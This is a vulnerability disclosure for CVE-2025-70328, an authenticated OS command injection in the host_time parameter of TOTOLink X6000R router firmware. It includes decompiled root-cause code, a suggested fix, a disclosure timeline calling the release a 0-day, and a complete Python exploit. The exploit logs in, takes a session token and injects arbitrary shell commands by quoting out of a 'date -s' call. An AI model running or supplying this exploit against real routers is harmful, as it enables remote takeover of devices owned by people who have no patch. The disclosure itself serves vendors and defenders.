# CVE-2025-70328
- **Discoverer:** Neighborhood-Hacker Team
- **Vulnerability Type:** OS Command Injection (CWE-78)

1.	Vulnerability Title
    
    a.  TOTOLink X6000R_Firmware V9.4.0cu.1498_B20250826 OS Command Injection


2.	High-level overview of the vulnerability and the possible effect of using it

    The `host_time` parameter of the `NTPSyncWithHost` handler in the `/usr/sbin/shttpd` executable is vulnerable to post-auth OS command injection. This allows an attacker to execute arbitrary system commands, leading to full system compromise (RCE).

3.	Exact product that was found to be vulnerable including complete version information

    a. vulnerable code exists in X6000R_Firmware V9.4.0cu.1498_B20250826 — specifically the web service binary /usr/sbin/shttpd.

    b. We tested the vulnerability against X6000R_Firmware V9.4.0cu.1498_B20250826

4.   Root Cause Analysis
  
  Since vendor does not provide source code, the following explanation is based on the firmware binary /usr/sbin/shttpd

  a. Detailed description of the vulnerability

In the function sub_4181A4, the host_time parameter received from the client is processed and passed directly into a shell command without proper sanitization. Only the first and second whitespace-separated tokens of host_time are validated; the remainder of the string is not.
    
```c
__int64 __fastcall sub_4181A4(__int64 a1, __int64 a2)
{
  const char *v4; // x20
  _QWORD v6[2]; // [xsp+38h] [xbp+38h] BYREF
  _QWORD v7[2]; // [xsp+48h] [xbp+48h] BYREF
  char s[256]; // [xsp+58h] [xbp+58h] BYREF

  v6[0] = 0LL;
  v6[1] = 0LL;
  v7[0] = 0LL;
  v7[1] = 0LL;
  memset(s, 0, sizeof(s));
  v4 = (const char *)sub_40C404(a1, "host_time");
  get_nth_val_safe(0LL, v4, 32LL, v6, 16LL);
  get_nth_val_safe(1LL, v4, 32LL, v7, 16LL);
  if ( (unsigned int)is_cmd_string_valid(v6) && (unsigned int)is_cmd_string_valid(v7) )
  {
    CsteSystem("/etc/init.d/sysntpd stop", 0LL);
    snprintf(s, 0x100uLL, "date -s '%s'", v4);
    CsteSystem(s, 0LL);
    CsteSystem("echo 1 > /tmp/NTPValid", 0LL);
    Uci_Set_Str(11LL, "ntp", "time_flag", "1");
    Uci_Set_Str(11LL, "ntp", "enabled", "0");
    Uci_Commit(11LL);
  }
  sub_40C438(a2, 1LL, "", 0LL, "", "reserv");
  return 0LL;
}
```
  b.   Suggested fixes

Apply is_cmd_string_valid() to the entire host_time string (or to every token parsed from it) before embedding the value into a shell command, or — preferably — avoid invoking a shell and use a safe API to set the system time.

5.   Exploit 
  
```python
import argparse
import hashlib
import json
import sys
from urllib.parse import urljoin, urlparse, parse_qs

import requests
requests.packages.urllib3.disable_warnings()

TOPIC_DEFAULT = "NTPSyncWithHost"

def md5_hex(s: str) -> str:
    return hashlib.md5(s.encode("utf-8")).hexdigest()

def build_login_body(user: str, password: str) -> str:
    u = md5_hex(user)
    p = md5_hex(password)
    body = {"username": u, "password": p, "flag": "0", "topicurl": "loginAuth"}
    return json.dumps(body, separators=(",", ":"))

def extract_token_from_login_json(j: dict) -> str | None:
    if isinstance(j, dict) and j.get("token"):
        return j["token"]
    jp = j.get("jump_page")
    if isinstance(jp, str):
        parsed = urlparse(jp)
        from urllib.parse import parse_qs
        q = parse_qs(parsed.query)
        tok = q.get("token", [None])[0]
        if tok:
            return tok
    return None

def login_get_token(base_url: str, user: str, password: str, timeout: int = 10) -> str:
    login_url = urljoin(base_url, "/cgi-bin/cstecgi.cgi")
    headers = {
        "Host": urlparse(base_url).netloc,
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": base_url,
        "Referer": urljoin(base_url, "/login.html"),
        "User-Agent": "safe-cstecgi-test/1.0",
        "Accept": "application/json, text/javascript, */*; q=0.01",
    }
    body_text = build_login_body(user, password)

    resp = requests.post(login_url, headers=headers, data=body_text, timeout=timeout, verify=False)
    print(f"[+] Login HTTP {resp.status_code}")
    resp.raise_for_status()
    try:
        j = resp.json()
    except ValueError:
        raise RuntimeError(f"Login response is not JSON: {resp.text[:200]!r}")
    tok = extract_token_from_login_json(j) or resp.cookies.get("token")
    if not tok:
        raise RuntimeError(f"Token not found. Response (part of JSON): {str(j)[:200]}")
    return tok

def send_topic(base_url: str, token: str, payload: dict, timeout: int = 10):
    url = urljoin(base_url, f"/cgi-bin/cstecgi.cgi?token={token}")
    headers = {
        "Host": urlparse(base_url).netloc,
        "Content-Type": "application/json",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "safe-cstecgi-test/1.0",
        "Accept": "application/json, text/plain, */*",
    }
    body = {"topicurl": TOPIC_DEFAULT, **payload}
    body_text = json.dumps(body, separators=(",", ":"), ensure_ascii=False)
    print("\n[*] Target Endpoint:", url)
    print("[*] Body   :", body_text)

    resp = requests.post(url, headers=headers, data=body_text.encode("utf-8"), timeout=timeout, verify=False)
    print(f"[+] Topic HTTP {resp.status_code}")
    resp.raise_for_status()
    try:
        return resp.json()
    except ValueError:
        return {"raw": resp.text}

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", required=True, help="ex: http://192.168.0.16")
    ap.add_argument("--id", default="admin", help="id(default: admin)")
    ap.add_argument("--password", required=True, help="password")
    ap.add_argument("--cmd", default="2025-10-18 13:45:00", help="ex: ls")
    args = ap.parse_args()

    base_url = args.host.rstrip("/")

    try:
        token = login_get_token(base_url, args.id, args.password)
        print(f"[+] Token: {token}")
    except Exception as e:
        print(f"[Error] login/Token failed: {e}", file=sys.stderr)
        sys.exit(1)

    payload = {"host_time": "2025-10-18 13:45:00 '; " + args.cmd +" #"}
    print(payload)
    try:
        resp = send_topic(base_url, token, payload)
        print("[+] cmd success!")
    except Exception as e:
        print(f"[error] cmd failed: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()

```
6. Disclosure Timeline

- 2025-10-22: Vulnerability reported to vendor (TOTOLINK).
- 2025-12-21: No response from vendor after 60 days.
- 2025-12-22: Vulnerability reported to MITRE (CVE Assignment Team).
- 2026-02-11: CVE ID assigned (RESERVED state).
- 2026-02-23: Public disclosure (0-day) and notification to MITRE for publication.

